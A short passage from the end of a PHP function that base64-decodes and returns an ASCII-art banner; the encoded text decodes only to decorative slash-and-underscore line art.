IA0KICAgICAvOi8gIC8gICAgICAgIC86LyAgLyAgICAgICBcOjovICAvICAgICAgICAgICAgICAg
ICAgICBcL19fLyAgICANCiAgICAgXC9fXy8gICAgICAgICBcL19fLyAgICAgICAgIFwvX18vICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgDQo=
EOT;

    return base64_decode($banner);
}
